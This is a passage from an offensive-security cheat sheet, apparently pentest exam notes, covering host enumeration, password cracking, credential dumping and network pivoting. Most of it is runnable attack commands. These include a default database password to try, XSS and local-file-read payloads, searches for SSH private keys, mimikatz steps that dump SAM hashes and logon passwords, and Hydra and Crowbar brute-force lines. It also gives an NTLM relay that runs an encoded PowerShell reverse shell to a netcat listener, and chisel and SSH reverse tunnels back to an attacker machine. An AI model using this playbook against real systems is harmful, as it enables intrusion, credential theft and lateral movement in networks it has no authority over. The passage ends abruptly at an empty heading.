- [Two RCEs are better than one: write-up of an interesting lateral movement](https://medium.com/@seeu-inspace/two-rces-are-better-than-one-write-up-of-an-interesting-lateral-movement-66a52d42e075)



### <ins>Direct database access</ins>

- If it's found that standard users have direct access to the database, there is the possibility for users to read and write data that is not otherwise accessible through the client application.
- If the SQL server requires a Windows User access, use the command `runas /user:localadmin <SQL-SERVER-MANAGEMENT-STUDIO>`
- Try access with the account `sa:RPSsql12345`
- Intercept the requests and see if there is an [Insecure application design](#insecure-application-design). In that case, it might be possible to perform a Direct database access, SQLi or Remote Code Execution

**Resources**
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
- [Wireshark](https://www.wireshark.org/)



### <ins>Insecure Windows Service permissions</ins>

Windows service executable might be configured with insecure permissions. Services configured to use an executable with weak permissions are vulnerable to privilege escalation attacks.

Unprivileged users have the ability to change or replace the executable with arbitrary code, which would then be run the following time the service is launched. This can lead to privilege escalation depending on the user the service is running as.



### <ins>Code injection</ins>
- Check for classic HTML injections and [XSS](cross-site-scripting-xss)
  - Try to use a `SSID` as a vector for an XSS with a payload like `"/><img src=x onerror=alert(1)>`
- Check if `<webview>` works. If it does, it's might be possible to achieve a LFI with a payload like this `<webview src="file:///etc/passwd"></webview>`. [[Reference](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)]


### <ins>Windows persistence</ins>

**Resources**
- [persistence-info.github.io](https://persistence-info.github.io/)
- [PayloadsAllTheThings/Windows - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)

## System Attacks

### <ins>Information gathering</ins>

#### Windows

```PowerShell
<# gather information about current user #>
whoami
net user <user>
whoami /priv

<# gather user context information #>
id

<# discover other user accounts on the system #>
net user

<# discover localgroups and users in those groups#>
whoami /groups
net localgroup
net user <username>
PS C:\> Get-LocalGroupMember <group>

<# enumerate the Hostname #>
hostname

<# enumerate the Operating System Version and Architecture #>
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

<# enumerate running processes and services #>
PS C:\> Get-Process
tasklist /SVC

<# enumerate networking information #>
ipconfig /all
route print
netstat -ano

<# enumerate firewall status and rules #>
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

<# enumerate scheduled tasks #>
schtasks /query /fo LIST /v

<# enumerate installed applications and patch levels #>
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn

<# enumerate readable/writable files and directories #>
accesschk.exe -uws "Everyone" "C:\Program Files"
PS C:\> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

<# enumerate unmounted disks #>
mountvol

<# enumerate device drivers and Kernel modules #>
PS C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

<# enumerating binaries that AutoElevate #>
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

<# find interesting files #>
Get-ChildItem -Path <PATH> -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <PATH> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <PATH> -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

<# see history of commands #>
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Public\Transcripts\transcript01.txt

<# find secrets #>
reg query HKLM /f password /t REG_SZ /s
Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt

```

To use Event Viewer to search for events recorded by Script Block Logging:
1. Open the Event Viewer:
   - Press Windows key + R to open the Run dialog box.
   - Type `eventvwr.msc` and press Enter.
2. In the Event Viewer window, expand "Applications and Services Logs"
3. Expand the "Microsoft-Windows-PowerShell/Operational" log
4. Click on the "Filter Current Log" option on the right-hand side of the window
5. In the Filter Current Log dialog box, enter "4104" as the Event ID
6. Click on the "OK" button to apply the filter
7. The Event Viewer will now display only the events related to Script Block Logging



#### Linux
```bash
# enumerate users
cat /etc/passwd

# enumerate the Hostname
hostname

# enumerate the Operating System Version and Architecture
cat /etc/issue
cat /etc/*-release
cat /etc/os-release
uname -a
uname -r
arch

# enumerate running processes and services
ps axu

# enumerate networking information
ip a
/sbin/route
routel
ss -anp

# inspect custom IP tables
cat /etc/iptables/rules.v4

# enumerate scheduled tasks
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
sudo crontab -l

# enumerate installed applications and patch levels
dpkg -l

# find all writable files
find / -writable -type d 2>/dev/null

# find all writable files in /etc
find /etc -maxdepth 1 -writable -type f

# find all readable files in /etc
find /etc -maxdepth 1 -readable -type f

# enumerate readable/writable files and directories
find / -writable -type d 2> /dev/null

# enumerate unmounted disks
cat /etc/fstab
mount
/bin/lsblk
lsblk

# enumerate device drivers and kernel modules
lsmod
/sbin/modinfo libata

# enumerating binaries that AutoElevate
find / -perm -u=s -type f 2>/dev/null

# find SSH private keys
find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null

```


### <ins>Password Attacks</ins>

[How Secure Is My Password?](https://howsecureismypassword.net/)

#### <ins>Wordlists</ins>
- [SecLists](https://github.com/danielmiessler/SecLists)
- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
- [OneListForAll](https://github.com/six2dez/OneListForAll)
- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
- [Scavenger](https://github.com/0xDexter0us/Scavenger)
- [cewl](https://digi.ninja/projects/cewl.php)
  - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
- Wordlists in kali
  - /usr/share/wordlists/seclists/Passwords/months.txt
  - /usr/share/wordlists/seclists/Passwords/seasons.txt
  - /usr/share/wordlists/metasploit/unix_passwords.txt
  - /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  - /usr/share/wordlists/rockyou.txt

**Brute Force Wordlists**

[Crunch](https://sourceforge.net/projects/crunch-wordlist/), see [crunch | Kali Linux Tools](https://www.kali.org/tools/crunch/). 

| Placeholder |  Character translation             |
| ----------- | ---------------------------------- |
| @           | Lower case alpha characters        |
| ,           | Upper case alpha characters        |
| %           | Numeric characters                 |
| ^           | Special characters including space |

Examples of usage:
- Structure of the passwords of the target: `[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]`. Run `crunch 8 8 -t ,@@^^%%%`
- Passwords between four and six characters in length, containing only the characters 0-9 and A-F: `crunch 4 6 0123456789ABCDEF -o crunch.txt`
- Use a pre-defined character-set with `-f` and include `mixalpha` to  include all lower and upper case letters `crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`

**Mutating wordlists**

When password policies are implemented, it is helpful to remove password policies that are guaranteed to fail from the worlist. Starting from a wordlist called `demo.txt`
- `sed -i '/^1/d' demo.txt` remove all number sequences

Many people just append a "1" to the end of an existing password when creating a password with a number value. Create a rule file with $1 that adds a "1" to each password in our wordlist.
- Add a rule for hashcat with `echo \$1 > demo.rule`

Many people have a tendency to capitalize the initial character in a password when they are required to use an upper case character.
- Add a rule with `echo '$1\nc' > demo.rule`
  - Note: each line in the file is interpreted as a new rule

For special characters:
- `$1 c $!` to have `Password1!`
- `$! $1 c` to have `Password!1`

Other rules
- Test the rules with `hashcat -r demo.rule --stdout demo.txt`
- `/usr/share/hashcat/rules` in Kali
- See: [rule_based_attack [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

#### Password Decrypts
- https://github.com/frizb/PasswordDecrypts
- ```
  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
  msf5 > irb
  key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
  require 'rex/proto/rfb'
  Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
  ```
- `aes_decrypt.py`
  - you need the key + iv to decrypt an encoded base64

#### <ins>Password Cracking</ins>

**Tools**
- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/hashcat/)
- [Ophcrack](https://ophcrack.sourceforge.io/)

#### John the Ripper
- `john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt user.hash`
- Note for Linux-based systems: first use the unshadow utility to combine the passwd and shadow files from the compromised system `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
- `john -incremental -users:<user list> <file to crack>` pure brute force attack, you can use `-user:<username>` to target a specific user
- `john --show crackme` display the passwords recovered
- `john --wordlist=<custom wordlist file> -rules <file to crack>` dictionary attack, use `-wordlist` instead of `--wordlist=<custom wordlist file>` to use the john default wordlist
- `john hash.txt --format=NT` simple attack to attack NT hashes
- `john --rules --wordlist=<custom wordlist file> hash.txt --format=NT` using password mutation rules
- `john --rules --wordlist=<custom wordlist file> unshadowed.txt`
- To distribute the load and speed up the cracking process (for multi core CPUs)
  1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
  2. Use the options `--fork=8` and `--node=9-16/16` on the first machine

#### Hashcat

- `hashcat --help | grep -i "sha-256"`
- `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- `hashcat -m 24200 user.hash /usr/share/wordlists/rockyou.txt --force`
- `hashcat -m 10900 'pbkdf2_sha256$216000$8Dawv0l1PGBR$n/Jnp5J0RM++B/vjWFp3R/jRzFaxGLxK9KGgwTuvX3M=' /usr/share/wordlists/rockyou.txt --force`
- https://systemweakness.com/cracking-user-passwords-stored-in-keycloak-with-hashcat-d56522cc2dc


#### Ophcrack

1. Install the tables
2. Load a password file with `Load`
3. Click on the `Crack` button

#### Password Manager: KeePass
- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` search for KeePass database files
- `keepass2john Database.kdbx > keepass.hash` format KeePass database for Hashcat with keepass2john
  - remove `Database:` from `keepass.hash`
- `hashcat -m 13400 keepass.hash wordlist.txt -r hashcat.rule --force` crack the KeePass database hash
  - find the mode of KeePass in Hashcat with `hashcat --help | grep -i "KeePass"`


#### SSH Private Key Passphrase

- Prerequisites: found username, old passwords (or common passwords), password policy and private key `id_rsa`
  - `chmod 600 id_rsa` to change the permissions
  - `id_rsa` needs a password
1. `ssh2john id_rsa > ssh.hash` > remove `id_rsa:`
2. For JtR, create a file for the rules in the file `ssh.rule` using the found password policy
   - add `[List.Rules:sshRules]` as the first line of the file
   - add the rules to JtR config `sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'`
3. `john --wordlist=ssh.passwords --rules=sshRules ssh.hash`
4. Connect to the ssh service with `ssh -i id_rsa -p <PORT> <user>@<IP>` and insert the found password

#### <ins>Network Service Attack</ins>

**Tools**
- [Metasploit](https://www.metasploit.com/)
- [Medusa](http://h.foofus.net/?page_id=51)
- [Spray](https://github.com/Greenwolf/Spray)
- [Crowbar](https://github.com/galkan/crowbar)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)

#### Metasploit

- SSH Brute force: `scanner/ssh/ssh_login`

#### Medusa, HTTP htaccess Attack

- `medusa -d` All the protocols medusa can interact with
- ` medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
  - `-m` htaccess-protected URL
  - `-h` target host
  - `-u` attack the admin user
  - `-P` wordlist file
  - `-M` HTTP authentication scheme

#### Crowbar, Remote Desktop Protocol Attack

- `crowbar --help`
- `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
  - `-b` specify the protocol
  - `-s` target server
  - `-u` username
  - `-c` wordlist
  - `-n` number of threads

#### THC Hydra

- `sudo hydra`
- `sudo hydra -L users.txt -P pass.txt <service://server> <options>` launch a dictionary attack
  - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
  - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
  - Specify a port with `-s <PORT>` in <options>
- `hydra -L usernames.txt -P passwords.txt 192.168.244.140 smtp -e nsr`
- `hydra -L usernames.txt -P usernames.txt 192.168.182.216 ssh -e nsr`
- `sudo hydra -L usernames.txt -P passwords.txt 192.168.157.21 smb2 -e nsr`
- `hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.190.208:7080/login.php/session:userid=^USER64^&pass=^PASS64^:C=/:F=403' -e nsr`

SSH Attack
- `sudo hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
  - `-l` specify the target username
  - `-P` specify a wordlist
  - `protocol://IP` o specify the target protocol and IP address respectively

HTTP POST Attack
- `sudo hydra http-form-post -U`
- `sudo hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
  - `-l` user name
  - `-P` wordlist
  - `-vV` verbose output
  - `-f` stop the attack when the first successful result is found
  - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`

#### Password protected files
- dfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
- rar2john backup.rar > crackme
  - john --wordlist=/usr/share/wordlists/rockyou.txt crackme
  - same for zip2john
- ssh2john id_rsa > ssh.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
- office2john RSA-Secured-Document-PII.docx > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- keepass2john jeeves.kdbx > jeeves.hash
  john jeeves.hash
- fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup1.zip

#### Custom wordlists
- Cewl
  - (at first, use just this list) `cewl http://192.168.134.126/ --with-numbers -w custom-wordlist.txt`
  - `cewl -d 5 -m 3 http://192.168.220.115/ -w custom-wordlist.txt`
  - `cewl --lowercase http://192.168.13444.126/ | grep -v CeWL >> custom-wordlist.txt`
  - `sort custom-wordlist.txt | uniq -u > final-wordlist.txt`
- generate usernames
  - `python2 ~/Documents/scripts/usernamer.py -f full_names.txt`
- `cupp -i`

#### More attacks
- `crackmapexec ssh 192.168.220.240 -u usernames.txt -p passwords.txt --continue-on-success`
- AES-256-CBC-PKCS7: https://github.com/mpgn/Padding-oracle-attack
  - `python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.229.119:2290 -u '/?c=' --error '<span id="MyLabel">0</span>'`

#### <ins>Leveraging Password Hashes</ins>

**Tools**
- [Sample password hash encoding strings](https://openwall.info/wiki/john/sample-hashes)
- [hashID](https://psypanda.github.io/hashID/)
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
- [mimikatz](https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html)
- [fgdump](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)
- [Credential Editor](https://www.ampliasecurity.com/research/windows-credentials-editor/)
- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
- [Responder.py](https://github.com/SpiderLabs/Responder)

**Notes**
- On most Linux systems, hashed passwords are stored in the `/etc/shadow` file
- On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM). Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3) to deter offline SAM database password attacks
- Windows NT-based systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM) (DES based) and NT LAN Manager (NTLM), wich uses MD4 hashing
- From Windows Vista on, the operating system disables LM by default and uses NTLM
- In Windows, get all local users in PowerShell with `Get-LocalUser`

#### Identify hashes
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
- [hashid](https://www.kali.org/tools/hashid/)
  - `hashid <HASH>`
- [Hash Analyzer - TunnelsUP](https://www.tunnelsup.com/hash-analyzer/)

#### mimikatz
1. `C:\Programs\mimikatz.exe`
2. `privilege::debug` enables the SeDebugPrivilge access right required to tamper with another process
3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
4. `lsadump::sam` dump the contents of the SAM database

#### Cracking NTLM
1. Identify the local users with `Get-LocalUser`
2. Run `mimikatz.exe` as an administrator
3. Use the command `privilege::debug` to have `SeDebugPrivilege` access right enabled
4. Use the command `token::elevate` to elevate to SYSTEM user privileges
5. Extract passwords from the system
   - `sekurlsa::logonpasswords` attempts to extract plaintext passwords and password hashes from all available sources
   - `lsadump::sam` extracts the NTLM hashes from the SAM
6. Run `hashcat --help | grep -i "ntlm"` to retrieve the correct hash mode
7. `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

#### Cracking Net-NTLMv2 (or NTLMv2)

Capture a Net-NTLMv2 hash
1. `ip a` retrieve a list of all interfaces
2. `sudo responder -I <interface>`
3. Wait for a connection, capture the hash and save it as `user.hash`

Crack the Net-NTLMv2 hash
1. `hashcat --help | grep -i "ntlm"`
2. `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force`

Relaying Net-NTLMv2
1. Instead of printing a retrieved Net-NTLMv2 hash, we'll forward it to `<IP>` that it's the target machine
2. `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <BASE64>"`
   - use it to execute a reverse shell on your machine on port `<PORT>` and run a listener `nc -nvlp <PORT>`
   - see how to encode one-liner in base64 [here](#microsoft-office)
3. Now, if a user tries to connect to our machine with `dir \\<ATTACKER-IP>\test`, it will forward the request to `<IP>` and execute the command specified in the flag `-c`


#### Pass-the-Hash

Note: this attack works for `Administrator` user (except for certain conditions). Since Windows Vista, all Windows versions have [UAC remote restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) enabled by default.
- From Mimikatz, run `privilege::debug`, `token::elevate` and `lsadump::sam` to obtain the NTLM hash of Administrator
- Gain access to a SMB share with `smbclient \\\\<IP>\\<SMB-SHARE> -U Administrator --pw-nt-hash <Administrator-HASH>`
- Gain an interactive shell with `impacket-psexec -hashes <LMHash>:<NTHash> <username>@<ip> <command>`
  - This will always give a shell as `SYSTEM`, use `impacket-wmiexec` to obtain a shell as the user used for authentication
  - `<command>` is optional. If left blank, cmd.exe will be executed
  - See also: [impacket-scripts](https://www.kali.org/tools/impacket-scripts/) 

Other notes:
- ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
- ["PsExec Explainer by Mark Russinovich"](https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich)
- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
  - `pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe`
  - `-U` specifying the username and hash, along with the SMB share and the name of the command to execute



## Port Redirection and Tunneling

**Tools and notes**
- [rinetd](https://github.com/samhocevar/rinetd)
- [ProxyChains](https://github.com/haad/proxychains)
- [Plink.exe](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
- [HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
- [PWK Notes: Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)

### <ins>Port Forwarding</ins>

#### rinetd

1. Edit `/etc/rinetd.conf`, add `0.0.0.0 <Local-PORT> <IP> <DEST-PORT>`
   - This means that all traffic received on port `<Local-PORT>` of our machine, listening on all interfaces (`0.0.0.0`), regardless of destination address, will be forwarded to `<IP>:<DEST-PORT>`. 
2. Restart rinetd `sudo service rinetd restart` and confirm that the port is bound with `ss -antp | grep "80"`


#### Socat

- `socat -ddd TCP-LISTEN:<PORT>,fork TCP:<DEST-IP>:<DEST-PORT>`
  - The traffic received on port `<PORT>` will be forwarded to `<DEST-IP>:<DEST-PORT>`
- Example with SSH `socat TCP-LISTEN:2222,fork TCP:<IP>:22`
- Example with psql -h 192.168.50.63 -p 2345 -U postgres `socat -ddd TCP-LISTEN:2345,fork TCP:<IP>:5432`


### <ins>SSH Tunneling</ins>

See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/academy/ssh/tunneling-example)

#### SSH Local Port Forwarding
	
- Give a reverse shell [TTY](https://en.wikipedia.org/wiki/TTY) functionality with Python3's pty: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>`
- `ssh -N -L <bind_address>:<port>:<host>:<hostport> <username>@<address>`
  - Listen on all interfaces (`<bind_address>` = `0.0.0.0`) on port `<port>`, then forward all packets through the SSH tunnel (`<username>@<address>`) to port `<hostport>` on the host `<host>`
  - Verify it with `ss -ntplu`

#### SSH Dynamic Port Forwarding
1. From the reverse shell, run `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
2. Now we must direct our tools to use this proxy with ProxyChains
   - Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  <IP-reverse-shell> <port to bind to>`
3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
   - Example with nmap: `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn <IP>`
   - Example with SMB: `proxychains smbclient -L //<IP>/ -U <username> --password=<password>`

#### SSH Remote Port Forwarding
1. Start ssh on your local machine
2. On the reverse shell: `ssh -N -R [bind_address]:port:host:hostport [username@address]`
   - Set `[bind_address]` as `127.0.0.1`
   - `[username@address]` of your local ssh


#### SSH Remote Dynamic Port Forwarding
1. On the reverse shell, run `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `ssh -N -R <PORT> [username@address]`
   - `[username@address]` of your local ssh
2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  127.0.0.1 <PORT>`
3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains


#### Sshuttle
1. Note: it requires root privileges on the SSH client and Python3 on the SSH server
2. From the reverse shell, run `socat TCP-LISTEN:2222,fork TCP:<forward-IP>:<forward-PORT>`
3. `sshuttle -r <ssh-connection-string> <subnet> ...`
   - Specify the SSH connection string we want to use `<ssh-connection-string>` and the subnets that we want to tunnel through this connection (ex. `10.74.23.0/24 172.16.163.0/24`)


### <ins>ssh.exe</ins>
1. Start SSH server on Kali `sudo systemctl start ssh`
2. Connect to the Windows machine. Note: OpenSSH bundled with Windows has to be higher than `7.6` for remote dynamic port forwarding
3. `ssh -N -R <PORT> <kali>@<IP>`
4. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  127.0.0.1 <PORT>`).
5. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains

### <ins>Plink.exe</ins>

The general format is: `plink.exe <user>@<kali-IP> -R <kaliport>:<target-IP>:<target-port>`

The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`.

### <ins>Netsh</ins>

#### Local port forwarding
`netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<forward-PORT> connectaddress=<forward-IP>`
- use netsh (`interface`) context to `add` an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`)
- listening on `<target-IP>` (`listenaddress=target-IP`), port `<target-port>` (`listenport=<target-port>`)
- that will forward to `<forward-IP>` (`connectaddress=<forward-IP>`), port `<forward-port>` (`connectport=<forward-port>`)

#### allow inbound traffic on TCP port 4455
`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<IP> localport=<port> action=allow`


### <ins>Chisel</ins>

- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- https://ap3x.github.io/posts/pivoting-with-chisel/
- https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
- https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
- To have the process in the background, use `&` at the end of the command

**Port forwarding with chisel**: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
```
./chisel server -p 9999 --reverse
./chisel client 192.168.45.193:9999 R:8000:socks                <# dynamic port forwarding #>
./chisel.exe client 192.168.45.193:9999 R:8090:localhost:80     <# port forwarding port 80 
                                                                     connect then to localhost:8090 
                                                                     usefull for /phpmyadmin/ #>
```

**Proxy**
1. on the attacker machine: `chisel server -p LISTEN_PORT --reverse`
2. on the remote machine: `.\chisel.exe client ATTACKING_IP:LOCAL_OPEN_PORT R:LISTEN_PORT:socks`

**Reverse SOCKS Proxy**
1. On the attacker machine: `chisel server -p LISTEN_PORT --reverse`
2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:socks`
3. `sudo nano /etc/proxychains.conf`
   comment everything under `[ProxyList]` and add a new line `socks5 127.0.0.1 LISTEN_PORT`
   + you can also add FoxyProxy > `socks5 127.0.0.1 4242`

**Forward SOCKS Proxy**
1. On the remote machine: `./chisel server -p LISTEN_PORT --socks5`
2. On the attacker machine: `chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

**Remote Port Forward**
1. On the attacker machine: `./chisel server -p LISTEN_PORT --reverse`
2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT`

**Local port forwarding**
1. On the remote machine: `chisel server -p LISTEN_PORT`
2. On the attacker machine: `.\chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

**HTTP Tunneling**
1. The machines are `KALI01`, `DMZ01` and `INTERNAL01`
   - `KALI01` will listen on TCP port `1080`, a SOCKS proxy port
2. In `KALI01`, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
3. Deliver the Chisel executable to the `DMZ`
4. On `KALI01`, run Chisel `chisel server --port 8080 --reverse` and run `sudo tcpdump -nvvvXi <INTERFACE> tcp port 8080`
   - `ip a` retrieve the list of all interfaces
5. On `DMZ01`, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
6. Now, you should be able to see inbound Chisel traffic and an incoming connection in the Chisel server
7. Check if the SOCKS port has been opened by the `KALI01` Chisel server with `ss -ntplu`
8. How to use the HTTP Tunnel
   - SSH with Ncat: Pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at `127.0.0.1:1080` to connect to `INTERNAL01`
     - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
     - `%h` and `%p` tokens represent the SSH command host and port values
   - Another option is to use ProxyChains by adding `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` and prepending `sudo proxychains` to each command we want to run


### <ins>DNS Tunneling</ins>

#### Dnsmasq to setup a DNS resolver
1. Setup: `WAN`, `DMZ` and `INTERNAL`
2. From a machine inside `WAN`, setup a DNS server by using a software like [Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html)
   - `sudo dnsmasq -C dnsmasq.conf -d`. An example of configuration (see also [dnsmasq.conf.example](https://github.com/PowerDNS/dnsmasq/blob/master/dnsmasq.conf.example)):
     ```
     # Do not read /etc/resolv.conf or /etc/hosts
     no-resolv
     no-hosts

     # Define the zone
     auth-zone=organization.corp
     auth-server=organization.corp

     # TXT record
     txt-record=www.organization.corp,some info.
     txt-record=www.organization.corp,some other info.
     ```
   - `sudo tcpdump -i ens192 udp port 53`

#### [dnscat2](https://github.com/iagox86/dnscat2)
1. Setup: `WAN`, `DMZ` and `INTERNAL`
2. Start `dnscat2-server organization.corp` from `WAN` and connect from `INTERNAL` to it with `./dnscat feline.corp`
3. From `dnscat2-server` > `window -i 1` > `listen 127.0.0.1:<lister-PORT> <IP>:<PORT>`
   - `<IP>:<PORT>` = machine from `INTERNAL` 

### <ins>Metasploit Portfwd</ins>
- [Metasploit Unleashed - Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)

### <ins>Linux Privilege Escalation</ins>

#### <ins>Resources</ins>
- [TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [Linux Privilege Escalation for OSCP & Beyond! | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)
- ["Understanding and Using File Permissions | Ubuntu"](https://help.ubuntu.com/community/FilePermissions)
- ["File permissions and attributes | Arch Linux"](https://wiki.archlinux.org/title/File_permissions_and_attributes)
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- Tools
  - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
      - [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
  - [Unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
    - `./unix-privesc-check standard > output.txt`
  - [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
  - [LinEnum](https://github.com/rebootuser/LinEnum)
  - [Reverse Shell Generator - rsg](https://github.com/mthbernardes/rsg)

#### <ins>Strategy</ins>
